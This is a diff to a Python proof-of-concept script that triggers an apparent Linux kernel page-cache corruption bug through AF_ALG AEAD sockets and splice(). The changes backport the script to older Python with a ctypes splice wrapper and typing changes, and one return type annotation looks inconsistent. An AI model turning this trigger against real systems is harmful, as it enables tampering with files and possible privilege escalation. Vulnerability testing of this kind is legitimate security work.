@@ -16,12 +16,15 @@
 #
 # Use only on hosts you own or are explicitly authorized to test.
 
+import ctypes
+import ctypes.util
 import errno
 import os
 import socket
 import struct
 import sys
 import tempfile
+from typing import Optional, Tuple
 
 AF_ALG                    = 38
 SOL_ALG                   = 279
@@ -39,6 +42,29 @@ CRYPTLEN = 16    # one AES block
 TAGLEN   = 16    # truncated HMAC-SHA256
 MARKER   = b"PWND"
 
+# os.splice() was added in Python 3.10; use ctypes for 3.6 compatibility.
+_libc = ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6", use_errno=True)
+_libc.splice.restype  = ctypes.c_ssize_t
+_libc.splice.argtypes = [
+    ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
+    ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
+    ctypes.c_size_t, ctypes.c_uint,
+]
+
+
+def _splice(fd_in: int, fd_out: int, length: int,
+            offset_src: Optional[int] = None) -> int:
+    if offset_src is not None:
+        off = ctypes.c_int64(offset_src)
+        p_off = ctypes.pointer(off)
+    else:
+        p_off = None
+    ret = _libc.splice(fd_in, p_off, fd_out, None, length, 0)
+    if ret < 0:
+        err = ctypes.get_errno()
+        raise OSError(err, os.strerror(err))
+    return ret
+
 
 def build_authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
     # struct rtattr { u16 rta_len; u16 rta_type } || __be32 enckeylen || keys
@@ -55,7 +81,7 @@ def algif_aead_loaded() -> bool:
     return os.path.isdir("/sys/module/algif_aead")
 
 
-def precheck() -> str | None:
+def precheck() -> Optional[str]:
     if not os.path.exists("/proc/crypto"):
         return "/proc/crypto missing"
     try:
@@ -71,7 +97,7 @@ def precheck() -> str | None:
     return None
 
 
-def attempt_trigger(target_path: str) -> tuple[bool, bytes]:
+def attempt_trigger(target_path: str) -> Tuple[bytes, bytes]:
     sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!!\n" * (PAGE // 32))[:PAGE]
     with open(target_path, "wb") as f:
         f.write(sentinel)
@@ -106,10 +132,10 @@ def attempt_trigger(target_path: str) -> tuple[bool, bytes]:
     # page-cache pages now sit in the destination scatterlist.
     pr, pw = os.pipe()
     try:
-        n = os.splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
+        n = _splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
         if n != CRYPTLEN + TAGLEN:
             raise RuntimeError(f"splice file->pipe short: {n}")
-        n = os.splice(pr, op.fileno(), n)
+        n = _splice(pr, op.fileno(), n)
         if n != CRYPTLEN + TAGLEN:
             raise RuntimeError(f"splice pipe->op short: {n}")
     except OSError as e:
